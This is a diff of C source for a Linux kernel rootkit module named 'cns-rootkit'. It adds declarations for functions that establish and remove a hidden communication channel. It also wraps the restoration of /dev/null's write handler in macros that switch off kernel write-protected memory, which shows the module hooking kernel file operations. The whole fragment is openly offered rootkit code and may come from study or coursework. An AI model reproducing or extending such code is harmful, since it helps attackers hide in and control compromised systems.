@@ -17,6 +17,9 @@
 MODULE_LICENSE("MIT");
 MODULE_AUTHOR("SAV");
 
+int establish_comm_channel(void);
+int unestablish_comm_channel(void);
+
 ssize_t cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);
 
 
@@ -60,9 +63,9 @@ int unestablish_comm_channel(void) {
   struct file_operations *dev_null_fop;
   dev_null_fop = (struct file_operations *) dev_null_file->f_op;
   filp_close(dev_null_file, 0);
-
+  DISABLE_W_PROTECTED_MEMORY
   dev_null_fop->write = original_dev_null_write;
-
+  ENABLE_W_PROTECTED_MEMORY
   printk(KERN_INFO "cns-rootkit: Successfully unestablished communication channel\n");
   return 0;
 }
